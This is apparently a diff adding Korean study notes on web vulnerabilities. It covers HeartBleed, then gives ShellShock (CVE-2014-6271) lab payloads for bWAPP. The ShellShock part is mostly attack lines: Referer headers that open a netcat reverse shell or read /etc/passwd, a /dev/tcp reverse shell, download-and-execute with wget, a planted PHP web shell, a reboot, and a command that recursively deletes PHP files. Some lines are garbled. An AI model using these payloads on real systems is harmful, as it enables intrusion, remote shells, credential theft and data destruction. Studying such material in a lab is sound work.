@@ -1060,3 +1060,64 @@ Condition(조건)
 
 ### 기타 주요 웹 취약점 - HeartBleed 취약점 이해 및 실습
 
+**HeartBleed 취약점 이해**
+- OpenSSL 라이브러리는 데이터 통신 간의 네트워크 암호화 프로토콜 TLS와 SSL 기능을 구현한 라이브러리
+- 서버와 클라이언트간의 연결을 안정적으로 지속시키기 위해 HeartBleed 과정이 필요
+- 미국시간으로 2014.4.7일 OpenSSL HeartBeat 취약성에 대한 발표 (인터넷 침해대응 센터(KrCERT) 홈페이지에 4월 9일 보안공지)
+- 하트비트 (HeartBeat)라는 확장 모듈에서 클라이언트 요청 메시지를 처리할 때 데이터 길이 검증을 수행하지 않아 시스템 메모리에 저장된 64KB 크기의 데이터를 외부에서 아무런 제한 없이 탈취할 수 있는 취약점
+- 하트비트: 클라이언트와 서버 간의 연결 상태 체크를 위한 OpenSSL 암호화 라이브러리의 확장 모듈
+- OpenSSL 취약점은 아직도 꾸준히 신규 취약점 발생
+
+**HeartBleed 취약점을 통한 침해사례**
+- 캐나다 국세청을 통해 사회보장번호 900여개가 유출
+- 영국에서도 150만여명의 가입자를 보유한 육아 관련 사이트 '멈스넷'(Mumsnet)을 상대로 이용자 정보에 접근
+
+---
+
+### 기타 주요 웹 취약점 - 쉘샤크 취약점 이해 및 실습
+
+**ShellShock 취약점 사례**
+- 2014년 9월 24일 스테판 챠젤라스(Stephane CChazelas)에 의해 원격코드 인젝션 제로데이 취약점(CVE-2014-6271)이 공개
+- 환경변수 / 함수 선언 / 삽입된 명령어
+- bash-4.3/builtins/evalstring.c
+- parse_and_execute() 함수는 전달된 문자열의 끝까지 처리하기 위해 반복문(While)을 사용하는데, 함수 선언문 뒤에 명령어가 삽입된 것을 확인하고 반복문을 종료시키는 코드가 없음.
+
+방화벽 룰을 임시적으로 내려야 함 iptables -F
+```
+Referer: () { :;}; echo "bWAPP:" $(/bin/sh -c "expr 1 + 1")
+Referer: () { :;}; echo "Vulnerable bWAPP:"
+Referer: () { :;}; echo "Vulnerable bWAPP:" $(/bin/sh -c "nc 192.168.206.132 7777 -e /bin/bash")
+Referer: () { :;}; echo "Vulnerable bWAPP:"" $(/bin/sh -c "cat /etc/passwd")
+```
+
+**ShellShock 취약점 추가 공격 패턴**
+
+공격 | 삽입 명령어
+
+리버스 셸 연결 | /bin/bash -i > /dev/tcp/localhost/8081 0>&1
+
+악성파일 다운
+
+시스템 상태 체크
+
+계정 탈취
+
+웹 셸 생성
+
+시스템 재시작
+
+PHP 소스 삭제
+
+
+
+wget -O /tmp/syslogd http://localhost/prog; chmod 777 /tmp/syslogd: /tmp/syslogd;
+/bin/ping -c localhost
+
+/bin/cat /etc/passwd > dumped_file
+
+echo W" <? ₩W$cmd = ₩W$_REQUEST[WWW"cmdwww"]; if(ww$cmd != www"
+₩WW") print Shell_Exec(₩₩$cmd ;? >₩"> .. / .. /p.php & o
+
+/bin/bash -c ₩"reboot₩"
+
+find / -name *. php | xargs rm -rf
